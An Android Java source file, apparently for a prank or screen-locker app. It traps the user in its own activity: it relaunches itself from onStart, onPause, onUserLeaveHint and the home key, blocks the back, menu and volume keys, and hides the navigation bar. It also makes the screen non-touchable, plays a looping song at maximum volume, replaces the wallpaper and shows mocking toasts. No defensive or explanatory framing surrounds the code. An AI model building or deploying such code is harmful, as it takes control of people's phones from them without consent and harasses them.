package com.iapp.app;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.WallpaperManager;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.io.IOException;


public class MainActivity extends AppCompatActivity
    {
        @Override
        protected void onStart()
            {
                Intent n = new Intent(this,MainActivity.class);
                startActivity(n);
                super.onStart();
            }

        @Override

        public boolean onKeyDown(int keyCode, KeyEvent event)
            {
                if (keyCode == KeyEvent.KEYCODE_HOME)
                {
                    Intent n = new Intent(this,MainActivity.class);
                    startActivity(n);
                    /*new Handler().postDelayed(new Runnable()
                        {
                            @Override
                            public void run()
                                {
                                    Intent hj = new Intent(getApplicationContext(),MainActivity.class);
                                    startActivity(hj);
                                }
                        },2000);*/
                    String url = "http://";
                    try {
                        Intent i = new Intent("android.intent.action.MAIN");
                        i.setComponent(ComponentName.unflattenFromString("com.android.chrome/com.android.chrome.Main"));
                        i.addCategory("android.intent.category.LAUNCHER");
                        i.setData(Uri.parse(url));
                        startActivity(i);
                    }
                    catch(ActivityNotFoundException e) {
                        // Chrome is not installed
                        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        startActivity(i);
                    }
                }
                if (keyCode == KeyEvent.KEYCODE_MENU)
                {
                    Intent m = new Intent(this,MainActivity.class);
                    startActivity(m);
                }
            boolean result;
            switch( event.getKeyCode() ) {

                case KeyEvent.KEYCODE_MENU:
                case KeyEvent.KEYCODE_VOLUME_UP:
                case KeyEvent.KEYCODE_BACK:
                case KeyEvent.KEYCODE_VOLUME_DOWN:
                    result = true;
                    break;
                default:
                    result= super.dispatchKeyEvent(event);
                    break;

            }

            return result;
        }
        MediaPlayer player;
        @Override
        protected void onPause()
            {
                super.onPause();
                ActivityManager activityManager = (ActivityManager) getApplicationContext()
                        .getSystemService(Context.ACTIVITY_SERVICE);
                activityManager.moveTaskToFront(getTaskId(), 0);
                                Intent v = new Intent(this, MainActivity.class);
                                startActivity(v);
            }
        @SuppressLint("MissingSuperCall")
        @Override
        public void onBackPressed()
            {

            }

        @Override
        protected void onUserLeaveHint()
            {
                Intent n = new Intent(getApplicationContext(),MainActivity.class);
                n.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(n);
                PackageManager pm = this.getPackageManager();
                Intent iq = pm.getLaunchIntentForPackage("com.iapp.app");
                iq.setFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
                startActivity(iq);
                new Handler().postDelayed(new Runnable()
                    {
                        @Override
                        public void run()
                            {
                                Intent x = new Intent(getApplicationContext(),MainActivity.class);
                                startActivity(x);
                            }
                    },1000);
                Toast bqob = Toast.makeText(getApplicationContext(),"😂😂😂😂😂😂😂😂😂😂😂😂",Toast.LENGTH_LONG);
                bqob.show();
                super.onUserLeaveHint();
            }

        @SuppressLint({"RestrictedApi", "ResourceType"})
        @Override
        protected void onCreate(Bundle savedInstanceState)
            {
                super.onCreate(savedInstanceState);
                setContentView(R.layout.activity_main);
                player = MediaPlayer.create(this,R.raw.song);
                player.start();
                player.setLooping(true);
                player.setOnCompletionListener(new MediaPlayer.OnCompletionListener()
                    {
                        @Override
                        public void onCompletion(MediaPlayer mp)
                            {
                                player.release();
                            }
                    });
                overridePendingTransition(android.R.anim.fade_in,android.R.anim.fade_out);
                View decorView = getWindow().getDecorView();
                int uiOptions = View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_FULLSCREEN;
                decorView.setSystemUiVisibility(uiOptions);
                getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
                getWindow().setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
                getWindow().setFlags(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN,WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);
                AudioManager mgr = (AudioManager) getSystemService(AUDIO_SERVICE);
                Toast bob = Toast.makeText(this,"ENJOY !!!",Toast.LENGTH_LONG);
                bob.show();
                int valuess = 15;//range(0-15)
                mgr.setStreamVolume(AudioManager.STREAM_MUSIC, valuess, 0);
                ImageView imagePreview = findViewById(R.id.preview);

                        WallpaperManager myWallpaperManager = WallpaperManager.getInstance(getApplicationContext());
                try {
                    myWallpaperManager.setResource(R.drawable.f);
                } catch (IOException e) {
                    e.printStackTrace();
                }
               // Uri newUri = this.getContentResolver().insert(uri, values);

               /* String url = "http://";
                try {
                    Intent i = new Intent("android.intent.action.MAIN");
                    i.setComponent(ComponentName.unflattenFromString("com.android.chrome/com.android.chrome.Main"));
                    i.addCategory("android.intent.category.LAUNCHER");
                    i.setData(Uri.parse(url));
                    startActivity(i);
                }
                catch(ActivityNotFoundException e) {
                    // Chrome is not installed
                    Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                    startActivity(i);
                }*/

            }

    }
